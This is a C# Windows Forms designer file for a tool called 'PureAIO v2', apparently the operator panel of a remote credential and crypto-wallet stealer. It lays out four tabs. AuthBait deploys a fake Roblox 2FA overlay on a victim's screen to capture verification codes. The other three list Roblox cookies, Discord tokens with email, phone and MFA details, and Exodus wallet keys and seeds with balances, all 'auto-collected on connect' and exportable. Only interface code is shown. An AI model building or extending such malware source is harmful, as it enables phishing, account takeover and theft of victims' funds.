namespace PureAIO
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null)) components.Dispose();
            base.Dispose(disposing);
        }

        // ── controls ──────────────────────────────────────────────────────────
        private System.Windows.Forms.TabControl             tabMain;

        // Connection status (top-level, sits outside tabs)
        private System.Windows.Forms.Label                  lblConnectionStatus;

        // AuthBait tab
        private System.Windows.Forms.TabPage                tabAuthBait;
        private System.Windows.Forms.Button                 btnStartAuthBait;
        private System.Windows.Forms.Label                  lblAuthBaitStatus;
        private System.Windows.Forms.Label                  lblCapturedCode;
        private System.Windows.Forms.Label                  lblAuthBaitHeader;
        private System.Windows.Forms.Label                  lblAuthBaitDesc;
        private System.Windows.Forms.RichTextBox            rtbAuthBait;

        // Roblox tab
        private System.Windows.Forms.TabPage                tabRoblox;
        private System.Windows.Forms.SplitContainer         splitRoblox;
        private System.Windows.Forms.Label                  lblRobloxHeader;
        private System.Windows.Forms.Label                  lblRobloxInput;
        private System.Windows.Forms.TextBox                txtRobloxInput;
        private System.Windows.Forms.Button                 btnRobloxCheck;
        private System.Windows.Forms.Label                  lblRobloxStatus;
        private System.Windows.Forms.ListView               lvRoblox;
        private System.Windows.Forms.Button                 btnRobloxCopy;
        private System.Windows.Forms.Button                 btnRobloxExport;
        private System.Windows.Forms.RichTextBox            rtbRobloxLog;

        // Discord tab
        private System.Windows.Forms.TabPage                tabDiscord;
        private System.Windows.Forms.SplitContainer         splitDiscord;
        private System.Windows.Forms.Label                  lblDiscordHeader;
        private System.Windows.Forms.Label                  lblDiscordInput;
        private System.Windows.Forms.TextBox                txtDiscordInput;
        private System.Windows.Forms.Button                 btnDiscordCheck;
        private System.Windows.Forms.Label                  lblDiscordStatus;
        private System.Windows.Forms.ListView               lvDiscord;
        private System.Windows.Forms.Button                 btnDiscordCopy;
        private System.Windows.Forms.Button                 btnDiscordExport;
        private System.Windows.Forms.RichTextBox            rtbDiscordLog;

        // Exodus tab
        private System.Windows.Forms.TabPage                tabExodus;
        private System.Windows.Forms.SplitContainer         splitExodus;
        private System.Windows.Forms.Label                  lblExodusHeader;
        private System.Windows.Forms.Label                  lblExodusStatus;
        private System.Windows.Forms.ListView               lvExodus;
        private System.Windows.Forms.ListView               lvExodusBalances;
        private System.Windows.Forms.Label                  lblExodusKeys;
        private System.Windows.Forms.Label                  lblExodusBalancesHeader;
        private System.Windows.Forms.Button                 btnExodusExport;
        private System.Windows.Forms.RichTextBox            rtbExodusLog;

        // ── colour palette ────────────────────────────────────────────────────
        static readonly System.Drawing.Color BgDark      = System.Drawing.Color.FromArgb(18,  18,  22);
        static readonly System.Drawing.Color BgCard      = System.Drawing.Color.FromArgb(26,  26,  32);
        static readonly System.Drawing.Color BgInput     = System.Drawing.Color.FromArgb(34,  34,  42);
        static readonly System.Drawing.Color Accent      = System.Drawing.Color.FromArgb(88,  101, 242);
        static readonly System.Drawing.Color AccentGreen = System.Drawing.Color.FromArgb(60,  180, 100);
        static readonly System.Drawing.Color AccentRed   = System.Drawing.Color.FromArgb(237, 66,  69);
        static readonly System.Drawing.Color TextPrimary = System.Drawing.Color.FromArgb(220, 220, 230);
        static readonly System.Drawing.Color TextMuted   = System.Drawing.Color.FromArgb(130, 130, 150);
        static readonly System.Drawing.Color BorderColor = System.Drawing.Color.FromArgb(50,  50,  65);

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();

            // ── Root form ─────────────────────────────────────────────────────
            this.Text            = "PureAIO v2";
            this.Size            = new System.Drawing.Size(900, 644);
            this.MinimumSize     = new System.Drawing.Size(800, 564);
            this.BackColor       = BgDark;
            this.ForeColor       = TextPrimary;
            this.Font            = new System.Drawing.Font("Segoe UI", 9f);
            this.StartPosition   = System.Windows.Forms.FormStartPosition.CenterScreen;

            // ── Connection status bar ─────────────────────────────────────────
            lblConnectionStatus = new System.Windows.Forms.Label
            {
                Text      = "○ Not connected",
                Font      = new System.Drawing.Font("Segoe UI", 8.5f, System.Drawing.FontStyle.Bold),
                ForeColor = AccentRed,
                AutoSize  = false,
                Dock      = System.Windows.Forms.DockStyle.Top,
                Height    = 24,
                TextAlign = System.Drawing.ContentAlignment.MiddleRight,
                Padding   = new System.Windows.Forms.Padding(0, 0, 10, 0),
                BackColor = System.Drawing.Color.FromArgb(22, 22, 28),
            };
            this.Controls.Add(lblConnectionStatus);

            // ── Tab control ───────────────────────────────────────────────────
            tabMain = new System.Windows.Forms.TabControl
            {
                Dock         = System.Windows.Forms.DockStyle.Fill,
                Padding      = new System.Drawing.Point(12, 6),
                Font         = new System.Drawing.Font("Segoe UI", 9.5f, System.Drawing.FontStyle.Regular),
                BackColor    = BgDark,
                ItemSize     = new System.Drawing.Size(110, 28),
            };

            // ══════════════════════════════════════════════════════════════════
            //  AUTH BAIT TAB
            // ══════════════════════════════════════════════════════════════════
            tabAuthBait = new System.Windows.Forms.TabPage
            {
                Text = "🎣 AuthBait",
                BackColor = BgDark,
                Padding = new System.Windows.Forms.Padding(12),
            };

            lblAuthBaitHeader = new System.Windows.Forms.Label
            {
                Text      = "AUTHBAIT",
                Font      = new System.Drawing.Font("Segoe UI", 11f, System.Drawing.FontStyle.Bold),
                ForeColor = Accent,
                AutoSize  = true,
                Location  = new System.Drawing.Point(12, 14),
            };

            lblAuthBaitDesc = new System.Windows.Forms.Label
            {
                Text      = "Deploy a fake Roblox 2FA overlay on the victim's screen to capture their verification code.",
                Font      = new System.Drawing.Font("Segoe UI", 8.5f),
                ForeColor = TextMuted,
                Size      = new System.Drawing.Size(620, 18),
                Location  = new System.Drawing.Point(12, 36),
            };

            btnStartAuthBait = new System.Windows.Forms.Button
            {
                Text      = "▶  Start AuthBait",
                Size      = new System.Drawing.Size(160, 36),
                Location  = new System.Drawing.Point(12, 66),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = Accent,
                ForeColor = System.Drawing.Color.White,
                Font      = new System.Drawing.Font("Segoe UI", 9.5f, System.Drawing.FontStyle.Bold),
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnStartAuthBait.FlatAppearance.BorderSize = 0;
            btnStartAuthBait.Click += new System.EventHandler(this.btnStartAuthBait_Click);

            lblAuthBaitStatus = new System.Windows.Forms.Label
            {
                Text      = "Idle — click Start AuthBait to deploy the overlay.",
                Font      = new System.Drawing.Font("Segoe UI", 8.5f),
                ForeColor = TextMuted,
                AutoSize  = true,
                Location  = new System.Drawing.Point(182, 76),
            };

            lblCapturedCode = new System.Windows.Forms.Label
            {
                Text      = "",
                Font      = new System.Drawing.Font("Consolas", 28f, System.Drawing.FontStyle.Bold),
                ForeColor = AccentGreen,
                AutoSize  = true,
                Location  = new System.Drawing.Point(12, 118),
                Visible   = false,
            };

            rtbAuthBait = new System.Windows.Forms.RichTextBox
            {
                Anchor    = System.Windows.Forms.AnchorStyles.Bottom
                          | System.Windows.Forms.AnchorStyles.Left
                          | System.Windows.Forms.AnchorStyles.Right,
                Size      = new System.Drawing.Size(850, 320),
                Location  = new System.Drawing.Point(12, 180),
                BackColor = BgCard,
                ForeColor = TextPrimary,
                BorderStyle = System.Windows.Forms.BorderStyle.None,
                Font      = new System.Drawing.Font("Consolas", 8.5f),
                ReadOnly  = true,
                ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical,
            };

            tabAuthBait.Controls.AddRange(new System.Windows.Forms.Control[]
            {
                lblAuthBaitHeader, lblAuthBaitDesc,
                btnStartAuthBait, lblAuthBaitStatus,
                lblCapturedCode, rtbAuthBait
            });
            tabAuthBait.SizeChanged += (s, e) =>
            {
                rtbAuthBait.Size = new System.Drawing.Size(tabAuthBait.Width - 28, tabAuthBait.Height - 196);
            };

            // ══════════════════════════════════════════════════════════════════
            //  ROBLOX TAB
            // ══════════════════════════════════════════════════════════════════
            tabRoblox = new System.Windows.Forms.TabPage
            {
                Text      = "🍪 Roblox",
                BackColor = BgDark,
                Padding   = new System.Windows.Forms.Padding(10),
            };

            splitRoblox = new System.Windows.Forms.SplitContainer
            {
                Dock        = System.Windows.Forms.DockStyle.Fill,
                Orientation = System.Windows.Forms.Orientation.Horizontal,
                SplitterDistance = 220,
                BackColor   = BgDark,
                Panel1MinSize = 160,
                Panel2MinSize = 100,
            };

            // --- top panel: input + list ---
            lblRobloxHeader = new System.Windows.Forms.Label
            {
                Text      = "ROBLOX COOKIES",
                Font      = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold),
                ForeColor = Accent,
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 0),
            };

            lblRobloxInput = new System.Windows.Forms.Label
            {
                Text      = "Paste cookies (one per line) or leave empty to use auto-collected data:",
                ForeColor = TextMuted,
                Font      = new System.Drawing.Font("Segoe UI", 8f),
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 24),
            };

            txtRobloxInput = new System.Windows.Forms.TextBox
            {
                Multiline   = true,
                ScrollBars  = System.Windows.Forms.ScrollBars.Vertical,
                Location    = new System.Drawing.Point(0, 44),
                Size        = new System.Drawing.Size(620, 72),
                BackColor   = BgInput,
                ForeColor   = TextPrimary,
                BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle,
                Font        = new System.Drawing.Font("Consolas", 8.5f),
            };

            btnRobloxCheck = new System.Windows.Forms.Button
            {
                Text      = "Check",
                Location  = new System.Drawing.Point(626, 44),
                Size      = new System.Drawing.Size(90, 32),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = Accent,
                ForeColor = System.Drawing.Color.White,
                Font      = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold),
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnRobloxCheck.FlatAppearance.BorderSize = 0;
            btnRobloxCheck.Click += new System.EventHandler(this.btnRobloxCheck_Click);

            lblRobloxStatus = new System.Windows.Forms.Label
            {
                Text      = "Auto-collected on connect",
                ForeColor = TextMuted,
                Font      = new System.Drawing.Font("Segoe UI", 8.5f),
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 124),
            };

            lvRoblox = new System.Windows.Forms.ListView
            {
                Location      = new System.Drawing.Point(0, 144),
                Size          = new System.Drawing.Size(850, 60),
                View          = System.Windows.Forms.View.Details,
                FullRowSelect = true,
                GridLines     = false,
                BackColor     = BgCard,
                ForeColor     = TextPrimary,
                BorderStyle   = System.Windows.Forms.BorderStyle.None,
                Font          = new System.Drawing.Font("Segoe UI", 8.5f),
                OwnerDraw     = false,
            };
            lvRoblox.Columns.Add("Username",    110);
            lvRoblox.Columns.Add("UserID",       80);
            lvRoblox.Columns.Add("Robux",         70);
            lvRoblox.Columns.Add("Premium",       60);
            lvRoblox.Columns.Add("2FA",           45);
            lvRoblox.Columns.Add("Country",       70);
            lvRoblox.Columns.Add("Source",       100);
            lvRoblox.Columns.Add("Cookie (preview)", 200);

            btnRobloxCopy = new System.Windows.Forms.Button
            {
                Text      = "Copy Selected",
                Location  = new System.Drawing.Point(626, 82),
                Size      = new System.Drawing.Size(105, 28),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnRobloxCopy.FlatAppearance.BorderColor = BorderColor;
            btnRobloxCopy.FlatAppearance.BorderSize  = 1;
            btnRobloxCopy.Click += new System.EventHandler(this.btnRobloxCopy_Click);

            btnRobloxExport = new System.Windows.Forms.Button
            {
                Text      = "Export All",
                Location  = new System.Drawing.Point(626, 116),
                Size      = new System.Drawing.Size(105, 28),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnRobloxExport.FlatAppearance.BorderColor = BorderColor;
            btnRobloxExport.FlatAppearance.BorderSize  = 1;
            btnRobloxExport.Click += new System.EventHandler(this.btnRobloxExport_Click);

            splitRoblox.Panel1.Controls.AddRange(new System.Windows.Forms.Control[]
            {
                lblRobloxHeader, lblRobloxInput,
                txtRobloxInput, btnRobloxCheck, btnRobloxCopy, btnRobloxExport,
                lblRobloxStatus, lvRoblox
            });
            splitRoblox.Panel1.SizeChanged += (s, e) =>
            {
                int w = splitRoblox.Panel1.Width - 20;
                txtRobloxInput.Width = w - 110;
                lvRoblox.Size = new System.Drawing.Size(w, splitRoblox.Panel1.Height - 148);
            };

            // --- bottom panel: log ---
            rtbRobloxLog = new System.Windows.Forms.RichTextBox
            {
                Dock      = System.Windows.Forms.DockStyle.Fill,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                BorderStyle = System.Windows.Forms.BorderStyle.None,
                Font      = new System.Drawing.Font("Consolas", 8.5f),
                ReadOnly  = true,
            };
            splitRoblox.Panel2.Controls.Add(rtbRobloxLog);

            tabRoblox.Controls.Add(splitRoblox);

            // ══════════════════════════════════════════════════════════════════
            //  DISCORD TAB
            // ══════════════════════════════════════════════════════════════════
            tabDiscord = new System.Windows.Forms.TabPage
            {
                Text      = "🔑 Discord",
                BackColor = BgDark,
                Padding   = new System.Windows.Forms.Padding(10),
            };

            splitDiscord = new System.Windows.Forms.SplitContainer
            {
                Dock        = System.Windows.Forms.DockStyle.Fill,
                Orientation = System.Windows.Forms.Orientation.Horizontal,
                SplitterDistance = 220,
                BackColor   = BgDark,
                Panel1MinSize = 160,
                Panel2MinSize = 100,
            };

            lblDiscordHeader = new System.Windows.Forms.Label
            {
                Text      = "DISCORD TOKENS",
                Font      = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold),
                ForeColor = Accent,
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 0),
            };

            lblDiscordInput = new System.Windows.Forms.Label
            {
                Text      = "Paste tokens (one per line) or leave empty to use auto-collected data:",
                ForeColor = TextMuted,
                Font      = new System.Drawing.Font("Segoe UI", 8f),
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 24),
            };

            txtDiscordInput = new System.Windows.Forms.TextBox
            {
                Multiline   = true,
                ScrollBars  = System.Windows.Forms.ScrollBars.Vertical,
                Location    = new System.Drawing.Point(0, 44),
                Size        = new System.Drawing.Size(620, 72),
                BackColor   = BgInput,
                ForeColor   = TextPrimary,
                BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle,
                Font        = new System.Drawing.Font("Consolas", 8.5f),
            };

            btnDiscordCheck = new System.Windows.Forms.Button
            {
                Text      = "Check",
                Location  = new System.Drawing.Point(626, 44),
                Size      = new System.Drawing.Size(90, 32),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = Accent,
                ForeColor = System.Drawing.Color.White,
                Font      = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold),
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnDiscordCheck.FlatAppearance.BorderSize = 0;
            btnDiscordCheck.Click += new System.EventHandler(this.btnDiscordCheck_Click);

            lblDiscordStatus = new System.Windows.Forms.Label
            {
                Text      = "Auto-collected on connect",
                ForeColor = TextMuted,
                Font      = new System.Drawing.Font("Segoe UI", 8.5f),
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 124),
            };

            lvDiscord = new System.Windows.Forms.ListView
            {
                Location      = new System.Drawing.Point(0, 144),
                Size          = new System.Drawing.Size(850, 60),
                View          = System.Windows.Forms.View.Details,
                FullRowSelect = true,
                GridLines     = false,
                BackColor     = BgCard,
                ForeColor     = TextPrimary,
                BorderStyle   = System.Windows.Forms.BorderStyle.None,
                Font          = new System.Drawing.Font("Segoe UI", 8.5f),
            };
            lvDiscord.Columns.Add("Username",    120);
            lvDiscord.Columns.Add("UserID",       90);
            lvDiscord.Columns.Add("Email",        140);
            lvDiscord.Columns.Add("Phone",         90);
            lvDiscord.Columns.Add("MFA",           45);
            lvDiscord.Columns.Add("Nitro",         60);
            lvDiscord.Columns.Add("Source",        90);
            lvDiscord.Columns.Add("Token (preview)", 200);

            btnDiscordCopy = new System.Windows.Forms.Button
            {
                Text      = "Copy Selected",
                Location  = new System.Drawing.Point(626, 82),
                Size      = new System.Drawing.Size(105, 28),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnDiscordCopy.FlatAppearance.BorderColor = BorderColor;
            btnDiscordCopy.FlatAppearance.BorderSize  = 1;
            btnDiscordCopy.Click += new System.EventHandler(this.btnDiscordCopy_Click);

            btnDiscordExport = new System.Windows.Forms.Button
            {
                Text      = "Export All",
                Location  = new System.Drawing.Point(626, 116),
                Size      = new System.Drawing.Size(105, 28),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnDiscordExport.FlatAppearance.BorderColor = BorderColor;
            btnDiscordExport.FlatAppearance.BorderSize  = 1;
            btnDiscordExport.Click += new System.EventHandler(this.btnDiscordExport_Click);

            splitDiscord.Panel1.Controls.AddRange(new System.Windows.Forms.Control[]
            {
                lblDiscordHeader, lblDiscordInput,
                txtDiscordInput, btnDiscordCheck, btnDiscordCopy, btnDiscordExport,
                lblDiscordStatus, lvDiscord
            });
            splitDiscord.Panel1.SizeChanged += (s, e) =>
            {
                int w = splitDiscord.Panel1.Width - 20;
                txtDiscordInput.Width = w - 110;
                lvDiscord.Size = new System.Drawing.Size(w, splitDiscord.Panel1.Height - 148);
            };

            rtbDiscordLog = new System.Windows.Forms.RichTextBox
            {
                Dock      = System.Windows.Forms.DockStyle.Fill,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                BorderStyle = System.Windows.Forms.BorderStyle.None,
                Font      = new System.Drawing.Font("Consolas", 8.5f),
                ReadOnly  = true,
            };
            splitDiscord.Panel2.Controls.Add(rtbDiscordLog);

            tabDiscord.Controls.Add(splitDiscord);

            // ══════════════════════════════════════════════════════════════════
            //  EXODUS TAB
            // ══════════════════════════════════════════════════════════════════
            tabExodus = new System.Windows.Forms.TabPage
            {
                Text      = "💎 Exodus",
                BackColor = BgDark,
                Padding   = new System.Windows.Forms.Padding(10),
            };

            splitExodus = new System.Windows.Forms.SplitContainer
            {
                Dock        = System.Windows.Forms.DockStyle.Fill,
                Orientation = System.Windows.Forms.Orientation.Horizontal,
                SplitterDistance = 300,
                BackColor   = BgDark,
                Panel1MinSize = 200,
                Panel2MinSize = 80,
            };

            lblExodusHeader = new System.Windows.Forms.Label
            {
                Text      = "EXODUS WALLET",
                Font      = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold),
                ForeColor = Accent,
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 0),
            };

            lblExodusStatus = new System.Windows.Forms.Label
            {
                Text      = "Auto-collected on connect",
                ForeColor = TextMuted,
                Font      = new System.Drawing.Font("Segoe UI", 8.5f),
                AutoSize  = true,
                Location  = new System.Drawing.Point(220, 2),
            };

            lblExodusKeys = new System.Windows.Forms.Label
            {
                Text      = "Wallet Keys / Seeds",
                Font      = new System.Drawing.Font("Segoe UI", 8.5f, System.Drawing.FontStyle.Bold),
                ForeColor = TextMuted,
                AutoSize  = true,
                Location  = new System.Drawing.Point(0, 26),
            };

            lvExodus = new System.Windows.Forms.ListView
            {
                Location      = new System.Drawing.Point(0, 46),
                Size          = new System.Drawing.Size(430, 220),
                View          = System.Windows.Forms.View.Details,
                FullRowSelect = true,
                GridLines     = false,
                BackColor     = BgCard,
                ForeColor     = TextPrimary,
                BorderStyle   = System.Windows.Forms.BorderStyle.None,
                Font          = new System.Drawing.Font("Segoe UI", 8.5f),
            };
            lvExodus.Columns.Add("Kind",  100);
            lvExodus.Columns.Add("Value / Seed", 310);

            lblExodusBalancesHeader = new System.Windows.Forms.Label
            {
                Text      = "Balances",
                Font      = new System.Drawing.Font("Segoe UI", 8.5f, System.Drawing.FontStyle.Bold),
                ForeColor = TextMuted,
                AutoSize  = true,
                Location  = new System.Drawing.Point(445, 26),
            };

            lvExodusBalances = new System.Windows.Forms.ListView
            {
                Location      = new System.Drawing.Point(445, 46),
                Size          = new System.Drawing.Size(390, 220),
                View          = System.Windows.Forms.View.Details,
                FullRowSelect = true,
                GridLines     = false,
                BackColor     = BgCard,
                ForeColor     = TextPrimary,
                BorderStyle   = System.Windows.Forms.BorderStyle.None,
                Font          = new System.Drawing.Font("Segoe UI", 8.5f),
            };
            lvExodusBalances.Columns.Add("Ticker",    90);
            lvExodusBalances.Columns.Add("Balance",  120);
            lvExodusBalances.Columns.Add("USD Val",  110);

            btnExodusExport = new System.Windows.Forms.Button
            {
                Text      = "Export All",
                Location  = new System.Drawing.Point(0, 272),
                Size      = new System.Drawing.Size(105, 28),
                FlatStyle = System.Windows.Forms.FlatStyle.Flat,
                BackColor = BgCard,
                ForeColor = TextPrimary,
                Cursor    = System.Windows.Forms.Cursors.Hand,
            };
            btnExodusExport.FlatAppearance.BorderColor = BorderColor;
            btnExodusExport.FlatAppearance.BorderSize  = 1;
            btnExodusExport.Click += new System.EventHandler(this.btnExodusExport_Click);

            splitExodus.Panel1.Controls.AddRange(new System.Windows.Forms.Control[]
            {
                lblExodusHeader, lblExodusStatus,
                lblExodusKeys, lvExodus,
                lblExodusBalancesHeader, lvExodusBalances,
                btnExodusExport
            });
            splitExodus.Panel1.SizeChanged += (s, e) =>
            {
                int panW = splitExodus.Panel1.Width - 20;
                int listH = splitExodus.Panel1.Height - 76;
                lvExodus.Size          = new System.Drawing.Size((int)(panW * 0.52), listH);
                lvExodusBalances.Location = new System.Drawing.Point(lvExodus.Right + 10, 46);
                lvExodusBalances.Size  = new System.Drawing.Size(panW - lvExodus.Width - 10, listH);
                btnExodusExport.Location = new System.Drawing.Point(0, splitExodus.Panel1.Height - 36);
            };

            rtbExodusLog = new System.Windows.Forms.RichTextBox
            {
                Dock        = System.Windows.Forms.DockStyle.Fill,
                BackColor   = BgCard,
                ForeColor   = TextPrimary,
                BorderStyle = System.Windows.Forms.BorderStyle.None,
                Font        = new System.Drawing.Font("Consolas", 8.5f),
                ReadOnly    = true,
            };
            splitExodus.Panel2.Controls.Add(rtbExodusLog);

            tabExodus.Controls.Add(splitExodus);

            // ── assemble ──────────────────────────────────────────────────────
            tabMain.TabPages.AddRange(new System.Windows.Forms.TabPage[]
            {
                tabAuthBait, tabRoblox, tabDiscord, tabExodus
            });

            this.Controls.Add(tabMain);

            // ── tab paint (dark headers) ──────────────────────────────────────
            tabMain.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
            tabMain.DrawItem += (s, e) =>
            {
                var tab    = tabMain.TabPages[e.Index];
                var bounds = e.Bounds;
                bool selected = e.Index == tabMain.SelectedIndex;

                using (var bg = new System.Drawing.SolidBrush(selected ? BgCard : BgDark))
                    e.Graphics.FillRectangle(bg, bounds);

                using (var fg = new System.Drawing.SolidBrush(selected ? TextPrimary : TextMuted))
                using (var sf = new System.Drawing.StringFormat
                {
                    Alignment     = System.Drawing.StringAlignment.Center,
                    LineAlignment = System.Drawing.StringAlignment.Center,
                })
                    e.Graphics.DrawString(tab.Text, tabMain.Font, fg, bounds, sf);
            };
        }
    }
}
